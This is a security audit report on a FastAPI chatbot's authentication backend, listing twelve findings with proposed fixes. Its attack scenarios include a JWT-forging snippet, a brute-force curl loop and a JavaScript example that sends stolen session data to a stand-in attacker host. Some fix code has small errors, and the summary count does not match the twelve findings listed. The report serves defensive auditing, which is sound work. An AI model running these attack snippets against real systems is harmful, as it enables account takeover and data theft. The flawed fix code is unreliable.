# 🔒 Backend Security Audit Report

**Date:** April 13, 2026  
**Project:** TTC Information Chatbot  
**Scope:** Authentication & Authorization Backend  
**Status:** Found 10 Security Issues (3 Critical, 3 High, 4 Medium)

---

## Executive Summary

Your authentication backend has a **solid foundation** with good practices like bcrypt hashing, JWT tokens, and input validation. However, there are **10 security issues** ranging from critical to low priority that need to be addressed before production deployment.

**Critical Issues:** 3  
**High Priority:** 3  
**Medium Priority:** 4  
**Low Priority:** 2  

---

## 🔴 CRITICAL Issues (Fix Immediately)

### 1. **Weak Default SECRET_KEY**
**Location:** `backend/auth.py:17`  
**Severity:** CRITICAL  
**CVSS Score:** 9.8

**Problem:**
```python
SECRET_KEY = os.getenv("SECRET_KEY", "your-secret-key-change-in-production")
```

- Default key is hardcoded and obvious
- If deployed without setting `SECRET_KEY` env var, all tokens can be forged
- Anyone can decode/create valid JWT tokens

**Attack Scenario:**
```bash
# Any attacker can create an admin token:
SECRET_KEY = "your-secret-key-change-in-production"
import jwt
payload = {"sub": "attacker", "user_id": "any-id", "role": "admin"}
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
# Token is now valid!
```

**Fix - Enforce Non-Empty SECRET_KEY:**
```python
# backend/auth.py
import os
from fastapi import FastAPI

SECRET_KEY = os.getenv("SECRET_KEY")
if not SECRET_KEY or SECRET_KEY == "your-secret-key-change-in-production":
    raise ValueError(
        "FATAL: SECRET_KEY not set or still using default value!\n"
        "Set environment variable: export SECRET_KEY='your-generated-key'\n"
        "Generate with: python -c \"import secrets; print(secrets.token_urlsafe(32))\""
    )

ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
```

---

### 2. **CORS Misconfiguration - allow_origins=['*'] with allow_credentials=True**
**Location:** `main.py:137-144`  
**Severity:** CRITICAL  
**CVSS Score:** 9.6

**Problem:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],                # VULNERABLE!
    allow_credentials=True,             # VULNERABLE!
    allow_methods=["*"],                # VULNERABLE!
    allow_headers=["*"],                # VULNERABLE!
)
```

This combination allows **any website** to make requests with your credentials:
- Attacker creates malicious website
- User visits attacker's site while logged into your app
- Attacker's JavaScript can now access user data or perform actions

**Attack Scenario:**
```javascript
// attacker.com/steal.js
fetch('http://your-api.com/api/sessions', {
    method: 'GET',
    credentials: 'include',  // Include cookies/auth
    headers: {
        'Authorization': 'Bearer ' + stolenToken
    }
})
.then(r => r.json())
.then(data => fetch('attacker.server.com/steal?data=' + JSON.stringify(data)))
```

**Fix - Restrict CORS Origins:**
```python
# main.py
import os

# Only allow your frontend domain
ALLOWED_ORIGINS = os.getenv(
    "ALLOWED_ORIGINS",
    "http://localhost:3000"
).split(",")

if os.getenv("ENVIRONMENT") == "production":
    if "localhost" in ALLOWED_ORIGINS or "*" in ALLOWED_ORIGINS:
        raise ValueError("UNSAFE: localhost/wildcard CORS in production!")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,      # Specific domains only
    allow_credentials=False,            # Disable if using JWT instead
    allow_methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
    allow_origin_regex="https?://.*\.mydomain\.com",  # Pattern matching
)
```

---

### 3. **Exposed Default Credentials in Code**
**Location:** `backend/admin_setup.py:68`, docs, multiple files  
**Severity:** CRITICAL  
**CVSS Score:** 9.2

**Problem:**
- Default passwords visible in source code: `admin/changeme`, `demo/demo123`
- Documented in multiple files
- Visible in git history
- If repository is exposed, credentials are compromised

**Examples:**
```python
# backend/auth.py:155
def setup_default_users(db: DBSession) -> None:
    admin = User(
        username="admin",
        email="admin@ttc-chatbot.local",
        hashed_password=hash_password("changeme"),  # ← VISIBLE!
        role=UserRole.ADMIN,
    )
```

**Fix - Use Environment Variables:**
```python
# backend/admin_setup.py
import os

# Generated secure defaults
import secrets

DEFAULT_ADMIN_PASSWORD = os.getenv(
    "ADMIN_PASSWORD",
    secrets.token_urlsafe(12)  # Random 16-char password
)

if not os.getenv("ADMIN_PASSWORD"):
    print("⚠️ IMPORTANT: Set ADMIN_PASSWORD before production!")
    print(f"Generated temporary password: {DEFAULT_ADMIN_PASSWORD}")

def setup_default_users(db: DBSession) -> None:
    admin = User(
        username="admin",
        email="admin@ttc-chatbot.local",
        hashed_password=hash_password(DEFAULT_ADMIN_PASSWORD),
        role=UserRole.ADMIN,
    )
```

**Remove from documentation:**
- Delete hardcoded passwords from `AUTHENTICATION.md`
- Don't print plaintext passwords in logs
- Store in `.env.example` with `CHANGE_ME` placeholder

---

## 🟠 HIGH Priority Issues (Fix Before Deployment)

### 4. **No Rate Limiting on Login Endpoint**
**Location:** `backend/auth_routes.py:66-104`  
**Severity:** HIGH  
**CVSS Score:** 7.5

**Problem:**
```python
@router.post("/api/auth/login")
async def login(request: UserLoginRequest, db: DBSession = Depends(get_db)):
    # No rate limiting → Attacker can brute force password
    user = authenticate_user(request.username, request.password, db)
```

**Attack Scenario:**
```bash
# Attacker tries 1000 password combinations per second
for i in {1..10000}; do
    curl -X POST http://api.com/api/auth/login \
        -d "{\"username\":\"admin\",\"password\":\"guess$i\"}"
done
# Eventually will succeed
```

**Fix - Add Rate Limiting:**
```python
# requirements.txt (add)
slowapi>=0.1.9

# backend/auth_routes.py
from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["100 per day", "10 per minute"],
    storage_uri="memory://",
)

@router.post("/login")
@limiter.limit("5/minute")  # Max 5 attempts per minute
async def login(request: UserLoginRequest, db: DBSession = Depends(get_db)):
    user = authenticate_user(request.username, request.password, db)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Too many login attempts. Try again in 1 minute.",
        )
```

---

### 5. **No Account Lockout After Failed Attempts**
**Location:** `backend/auth_routes.py`, `backend/auth.py`  
**Severity:** HIGH  
**CVSS Score:** 7.2

**Problem:**
- No tracking of failed login attempts
- No automatic account lockout
- No security alerts to user

**Fix - Add Failed Login Tracking:**
```python
# backend/models.py (add to User model)
from sqlalchemy import Integer, DateTime

class User(Base):
    __tablename__ = "users"
    # ... existing fields ...
    
    login_attempts = Column(Integer, default=0)
    lockout_until = Column(DateTime, nullable=True)  # Timestamp when unlocked

# backend/auth.py
from datetime import timedelta

def authenticate_user(username: str, password: str, db: DBSession) -> Optional[User]:
    user = db.query(User).filter(User.username == username).first()
    if not user:
        return None
    
    # Check if account is locked
    if user.lockout_until and user.lockout_until > datetime.utcnow():
        remaining = (user.lockout_until - datetime.utcnow()).seconds // 60
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail=f"Account locked. Try again in {remaining} minutes."
        )
    
    if not verify_password(password, user.hashed_password):
        # Increment failed attempts
        user.login_attempts += 1
        if user.login_attempts >= 5:
            # Lock account for 15 minutes
            user.lockout_until = datetime.utcnow() + timedelta(minutes=15)
        db.commit()
        return None
    
    # Reset on successful login
    user.login_attempts = 0
    user.lockout_until = None
    user.last_login = datetime.utcnow()
    db.commit()
    
    return user
```

---

### 6. **No Audit Logging of Security Events**
**Location:** Throughout `backend/auth_routes.py`, `backend/auth.py`  
**Severity:** HIGH  
**CVSS Score:** 7.0

**Problem:**
- No logging of login attempts (successful or failed)
- No logging of token refresh
- No logging of permission denials
- Cannot detect or investigate security incidents

**Fix - Add Audit Logging:**
```python
# backend/logs.py (new file)
import logging
from datetime import datetime
from enum import Enum

class SecurityEvent(Enum):
    LOGIN_SUCCESS = "LOGIN_SUCCESS"
    LOGIN_FAILURE = "LOGIN_FAILURE"
    ACCOUNT_LOCKED = "ACCOUNT_LOCKED"
    TOKEN_REFRESH = "TOKEN_REFRESH"
    PERMISSION_DENIED = "PERMISSION_DENIED"
    ADMIN_CREATED = "ADMIN_CREATED"
    PASSWORD_RESET = "PASSWORD_RESET"

audit_logger = logging.getLogger("audit")
handler = logging.FileHandler("logs/audit.log")
handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
))
audit_logger.addHandler(handler)

def log_security_event(event: SecurityEvent, user: str, details: dict = None):
    audit_logger.info(f"{event.value} | user={user} | {details or ''}")

# backend/auth_routes.py
from backend.logs import log_security_event, SecurityEvent

@router.post("/login")
async def login(request: UserLoginRequest, db: DBSession = Depends(get_db)):
    user = authenticate_user(request.username, request.password, db)
    
    if not user:
        log_security_event(
            SecurityEvent.LOGIN_FAILURE,
            request.username,
            {"reason": "invalid_credentials"}
        )
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    log_security_event(
        SecurityEvent.LOGIN_SUCCESS,
        user.username,
        {"user_id": user.id, "ip": "request.client.host"}
    )
    
    # Generate token...
```

---

## 🟡 MEDIUM Priority Issues (Should Fix)

### 7. **No HTTPS Enforcement**
**Location:** `main.py`  
**Severity:** MEDIUM  
**CVSS Score:** 6.5

**Problem:**
- No redirect from HTTP to HTTPS
- No HSTS header
- Tokens sent over plain HTTP are intercepted

**Fix - Enforce HTTPS:**
```python
# main.py
import os
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.redirect import HTTPSRedirectMiddleware

ENVIRONMENT = os.getenv("ENVIRONMENT", "development")

if ENVIRONMENT == "production":
    # Redirect HTTP to HTTPS
    app.add_middleware(HTTPSRedirectMiddleware)
    
    # Add HSTS header (30 days)
    app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=["yourdomain.com", "www.yourdomain.com"],
    )

# Also add response headers
from fastapi.responses import JSONResponse

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    if ENVIRONMENT == "production":
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
    return response
```

---

### 8. **Possible Timing Attack in Password Verification**
**Location:** `backend/auth.py:48`  
**Severity:** MEDIUM  
**CVSS Score:** 5.3

**Problem:**
```python
# This uses passlib which already has constant-time comparison, but good to verify
def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)
```

While passlib already handles this correctly, timing attacks could theoretically leak info if username doesn't exist vs password is wrong.

**Fix - Use Constant-Time Comparisons:**
```python
# backend/auth.py
import hmac
import hashlib

def authenticate_user(username: str, password: str, db: DBSession) -> Optional[User]:
    # ALWAYS compute hash even if user doesn't exist
    # This prevents timing attacks that reveal if username exists
    
    user = db.query(User).filter(User.username == username).first()
    
    # Use dummy hash if user not found to maintain consistent timing
    if not user:
        dummy_hash = pwd_context.hash("constant-timing-protection")
        # Still do the verify to burn time
        pwd_context.verify(password, dummy_hash)
        return None
    
    if not verify_password(password, user.hashed_password):
        return None
    
    return user
```

---

### 9. **Missing Security Headers**
**Location:** `main.py`  
**Severity:** MEDIUM  
**CVSS Score:** 5.5

**Problem:**
- No Content Security Policy (CSP)
- No X-Frame-Options
- No X-Content-Type-Options

**Fix - Add Security Headers:**
```python
# main.py
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    
    # Prevent clickjacking
    response.headers["X-Frame-Options"] = "DENY"
    
    # Prevent MIME type sniffing
    response.headers["X-Content-Type-Options"] = "nosniff"
    
    # Enable XSS protection
    response.headers["X-XSS-Protection"] = "1; mode=block"
    
    # Content Security Policy
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'"
    )
    
    # Referrer Policy
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    
    return response
```

---

### 10. **SQL Injection Risk in User Queries (Low Risk - ORM Protection)**
**Location:** `backend/routes.py`, `backend/services.py`  
**Severity:** MEDIUM (Low Technical Risk)  
**CVSS Score:** 4.0

**Current Risk:** Very low - using SQLAlchemy ORM properly  
**But:** Need validation on user-controlled IDs

**Fix - Add ID Validation:**
```python
# backend/routes.py
import uuid

@router.get("/sessions/{session_id}")
async def get_session(
    session_id: str,
    db: DBSession = Depends(get_db),
    current_user: Optional[TokenData] = None,
):
    # Validate session_id is valid UUID format
    try:
        uuid.UUID(session_id)
    except ValueError:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid session ID format"
        )
    
    session = SessionService.get_session(session_id, db)
    # ... rest of code ...
```

---

## 🔵 LOW Priority Issues (Nice to Have)

### 11. **Setup Admin Security Key Not Validated Strictly**
**Location:** `backend/auth_routes.py:280-300`  
**Severity:** LOW  
**CVSS Score:** 3.0

**Problem:**
```python
@router.post("/api/auth/setup-admin")
async def setup_admin(request: UserRegisterRequest, security_key: str = Query(...)):
    admin_setup_key = os.getenv("ADMIN_SETUP_KEY", "change-me-in-production")
    
    if security_key != admin_setup_key:
        raise HTTPException(status_code=403, detail="Invalid security key")
```

Weak default is visible in code.

**Fix - Better Key Generation:**
```python
import secrets

def setup_admin(...):
    # Generate if not set, fail loudly
    admin_setup_key = os.getenv("ADMIN_SETUP_KEY")
    if not admin_setup_key:
        raise ValueError(
            "ADMIN_SETUP_KEY not set. Cannot initialize admin.\n"
            "Generate: python -c \"import secrets; "
            "print(secrets.token_urlsafe(32))\""
        )
    
    if security_key != admin_setup_key:
        log_security_event(
            SecurityEvent.ADMIN_INIT_ATTEMPT,
            "unknown",
            {"reason": "invalid_key"}
        )
        # Also add rate limiting
        await rate_limiter.check_rate_limit(request.client.host)
        raise HTTPException(status_code=403, detail="Invalid security key")
```

---

### 12. **Database Passwords Not Isolated**
**Location:** `backend/database.py`  
**Severity:** LOW  
**CVSS Score:** 2.5

**Problem:**
- DATABASE_URL might contain plaintext database password
- Could be visible in logs or error messages

**Fix - Better Secrets Management:**
```python
# backend/database.py
import os

# Use separate env vars for components
DB_USER = os.getenv("DB_USER")
DB_PASSWORD = os.getenv("DB_PASSWORD")
DB_HOST = os.getenv("DB_HOST", "localhost")
DB_PORT = os.getenv("DB_PORT", "5432")
DB_NAME = os.getenv("DB_NAME", "ttc_chatbot")

# Build URL programmatically to avoid it appearing in logs
if DB_USER and DB_PASSWORD:
    DATABASE_URL = f"postgresql://{DB_USER}:{DB_PASSWORD}@{DB_HOST}:{DB_PORT}/{DB_NAME}"
else:
    DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///./ttc_chatbot.db")

# Be careful not to log DATABASE_URL (it contains password!)
```

---

## Summary Grid

| ID | Issue | Severity | Status | Fix Time |
|----|-------|----------|--------|----------|
| 1 | Weak Default SECRET_KEY | CRITICAL | unfixed | 10 min |
| 2 | CORS Wildcard + Credentials | CRITICAL | unfixed | 15 min |
| 3 | Default Creds in Code | CRITICAL | unfixed | 20 min |
| 4 | No Rate Limiting | HIGH | unfixed | 30 min |
| 5 | No Account Lockout | HIGH | unfixed | 45 min |
| 6 | No Audit Logging | HIGH | unfixed | 60 min |
| 7 | No HTTPS Enforcement | MEDIUM | unfixed | 20 min |
| 8 | Timing Attack Risk | MEDIUM | low risk | 15 min |
| 9 | Missing Security Headers | MEDIUM | unfixed | 20 min |
| 10 | SQL Injection (Low Risk) | MEDIUM | very low risk | 10 min |
| 11 | Setup Key Not Validated | LOW | unfixed | 10 min |
| 12 | DB Passwords in Logs | LOW | unfixed | 10 min |

---

## 🚨 Action Items (Priority Order)

### Must Fix Before Production

- [ ] **CRITICAL 1:** Remove weak default SECRET_KEY - enforce environment variable
- [ ] **CRITICAL 2:** Fix CORS configuration - remove wildcard, specify domains only
- [ ] **CRITICAL 3:** Remove hardcoded default credentials from code
- [ ] **HIGH 1:** Add rate limiting to login endpoint
- [ ] **HIGH 2:** Implement account lockout after failed attempts
- [ ] **HIGH 3:** Add audit logging for security events
- [ ] **MEDIUM 1:** Enforce HTTPS in production
- [ ] **MEDIUM 2:** Add security headers

### Should Fix Soon

- [ ] **MEDIUM 3:** Improve timing attack protection
- [ ] **MEDIUM 4:** Add UUID validation for all IDs
- [ ] **LOW 1:** Improve setup admin security key handling
- [ ] **LOW 2:** Isolate database credentials

---

## Production Deployment Checklist

```bash
# ✅ Before deploying to production, verify:
[ ] SECRET_KEY is set and NOT default
[ ] CORS origins are specific domains, not "*"
[ ] All default passwords changed
[ ] Rate limiting enabled
[ ] Account lockout configured
[ ] Audit logging active
[ ] HTTPS enforced
[ ] Security headers present
[ ] No database passwords in code
[ ] All secrets in environment variables
[ ] Error messages don't leak info
[ ] HSTS header set
[ ] X-Content-Type-Options header set
```

---

## Recommendations for Continued Security

1. **Add Web Application Firewall (WAF)** - Protect against common attacks
2. **Implement 2FA/MFA** - Additional authentication layer
3. **Add CAPTCHA** - Prevent bot attacks on login
4. **Use Security Scanning** - Run OWASP ZAP, SQLMap regularly
5. **Penetration Testing** - Hire security firm for thorough testing
6. **Keep Dependencies Updated** - `pip-audit`, `safety` check regularly
7. **Implement API Key Rotation** - Allow users to rotate auth keys
8. **Add IP Whitelisting** - For admin endpoints
9. **Implement SAML/OAuth** - For enterprise SSO
10. **Regular Security Audits** - Monthly or quarterly

---

## Testing Your Fixes

```bash
# Test 1: Verify SECRET_KEY enforcement
python main.py  # Should fail if SECRET_KEY not set

# Test 2: Verify CORS
curl -H "Origin: attacker.com" \
     -H "Access-Control-Request-Method: POST" \
     http://localhost:8000/api/auth/login
# Should NOT include Access-Control-Allow-Origin

# Test 3: Rate limiting
for i in {1..10}; do
  curl -X POST http://localhost:8000/api/auth/login \
    -d '{"username":"test","password":"pass"}'
done
# Should get 429 Too Many Requests

# Test 4: Account lockout
# Try login 5 times with wrong password
# Should get locked out

# Test 5: Security headers
curl -I http://localhost:8000/docs
# Should include: X-Content-Type-Options, X-Frame-Options, etc.
```

---

**Report Generated:** April 13, 2026  
**Next Review:** After fixes implemented or in 30 days  
**Severity Level:** CRITICAL - Do not deploy to production without addressing critical issues
